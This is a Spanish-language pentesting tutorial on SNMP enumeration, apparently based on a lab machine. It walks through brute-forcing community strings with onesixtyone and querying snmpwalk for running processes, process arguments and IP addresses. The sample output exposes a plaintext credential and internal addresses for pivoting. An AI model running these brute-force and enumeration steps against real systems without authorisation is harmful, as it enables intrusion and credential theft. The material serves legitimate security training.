# **Enumeración de SNMP:**

El **Protocolo Simple de Administración de Red (SNMP)**, que se encuentra en el puerto **161/UDP**, es un protocolo diseñado para monitorizar y gestionar dispositivos en una red. Si bien es una herramienta administrativa muy útil, una configuración insegura puede exponer una cantidad masiva de información sensible, incluyendo procesos en ejecución, configuraciones de red, e incluso credenciales.

## **1. ¿Qué es SNMP y Dónde se Encuentra?**

  * **¿Qué es?** SNMP permite a los administradores de red consultar el estado de los dispositivos. Funciona con un sistema de "agentes" (los dispositivos) que exponen datos y un "gestor" (el administrador o atacante) que los consulta.
  * **¿Qué equipos lo usan?** Es extremadamente común en dispositivos de red como **routers, switches, impresoras y firewalls**, pero también se encuentra en **servidores (Linux y Windows)** para monitorizar su rendimiento, procesos y servicios.

### **Versiones de SNMP**

Existen tres versiones principales, con diferencias clave en seguridad:

1.  **SNMPv1:** La más antigua y menos segura. La autenticación se basa únicamente en una "Community String" enviada en texto plano.
2.  **SNMPv2c:** La más extendida. También utiliza **Community Strings** en texto plano, por lo que es igualmente vulnerable a ataques de fuerza bruta si se usan cadenas comunes.
3.  **SNMPv3:** La versión más segura. Introduce autenticación robusta y cifrado de datos, haciendo la enumeración no autorizada mucho más difícil.

## **2. El Talón de Aquiles: Las "Community Strings"**

Una **Community String** es básicamente una contraseña que controla el acceso a los datos de un agente SNMP. Existen dos tipos:

  * **Read-Only (RO):** Permite solo leer la información del dispositivo. La más común por defecto es `public`.
  * **Read-Write (RW):** Permite leer y modificar la configuración del dispositivo. La más común por defecto es `private`.

Encontrar una community string válida, especialmente una `private`, es el primer objetivo de un pentester.

-----

## **3. Fase de Enumeración y Ataque**

### **Paso 1: Descargar las MIBs (Base de Información de Gestión)**

Para que herramientas como `snmpwalk` puedan traducir los identificadores numéricos (OIDs) de SNMP a nombres legibles (como "hrSWRunName"), necesitamos las definiciones MIB.

1.  **Instalar las definiciones MIB:**
    ```bash
    sudo apt-get install snmp-mibs-downloader
    ```
2.  **Habilitar su carga:**
    Para que las herramientas las usen, debemos comentar la línea `mibs :` en el archivo de configuración de SNMP.
    ```bash
    # Comentar la siguiente línea en /etc/snmp/snmp.conf
    # mibs :
    ```

### **Paso 2: Fuerza Bruta de Community Strings con `onesixtyone`**

`onesixtyone` es una herramienta extremadamente rápida diseñada para un único propósito: encontrar community strings válidas mediante fuerza bruta.

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.10.10.92
```

**Resultado Obtenido:**

```
Scanning 1 hosts, 120 communities
10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
```

  * **Análisis:** ¡Éxito\! Hemos encontrado que la community string `public` es válida. La herramienta también nos proporciona información básica del sistema operativo.

### **Paso 3: Exfiltración de Información con `snmpwalk`**

Con la community string `public` en nuestro poder, podemos usar `snmpwalk` para "caminar" por el árbol de información del dispositivo y extraer datos.

#### **A. Fuga de Procesos en Ejecución**

Una de las fugas de información más críticas es la lista de procesos en ejecución.

**Comando para listar procesos:**

```bash
# -v2c: Especifica la versión de SNMP
# -c public: Especifica la community string
# hrSWRunName: Es el OID que corresponde a los nombres de los procesos en ejecución
snmpwalk -v2c -c public 10.10.10.92 hrSWRunName
```

También se puede usar el script de Nmap: `nmap -sU -p 161 --script snmp-processes {IP}`.

**Profundizando en un Proceso Específico:**
Si un proceso parece interesante (en este caso, uno con PID `810`), podemos solicitar toda la información relacionada con él.

```bash
snmpwalk -v2c -c public 10.10.10.92 hrSWRunTable | grep "810"
```

**Resultado Obtenido:**

```
HOST-RESOURCES-MIB::hrSWRunIndex.810 = INTEGER: 810
HOST-RESOURCES-MIB::hrSWRunName.810 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunID.810 = OID: SNMPv2-SMI::zeroDotZero
HOST-RESOURCES-MIB::hrSWRunPath.810 = STRING: "python"
HOST-RESOURCES-MIB::hrSWRunParameters.810 = STRING: "-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/"
HOST-RESOURCES-MIB::hrSWRunType.810 = INTEGER: application(4)
```

  * **¡Jackpot\!** El campo `hrSWRunParameters` revela los argumentos con los que se lanzó el proceso. En este caso, hemos encontrado unas **credenciales (`loki:godofmischiefisloki`)** utilizadas para un servidor web de autenticación simple. Este es un hallazgo de severidad alta.

#### **B. Fuga de Interfaces de Red e IPs**

SNMP también puede revelar toda la configuración de red del dispositivo.

**Comando para listar IPs:**

```bash
snmpwalk -v2c -c public 10.10.10.92 ipAddressType
```

**Resultado Obtenido:**

```
IP-MIB::ipAddressType.ipv4."10.10.10.92" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv4."127.0.0.1" = INTEGER: unicast(1)
IP-MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:94:ce:b0" = INTEGER: unicast(1)
...
```

  * **Análisis:** Esto nos confirma todas las direcciones IP (IPv4 e IPv6) configuradas en el host, lo que puede revelar interfaces de red ocultas o internas, muy útiles para el pivoting y el movimiento lateral.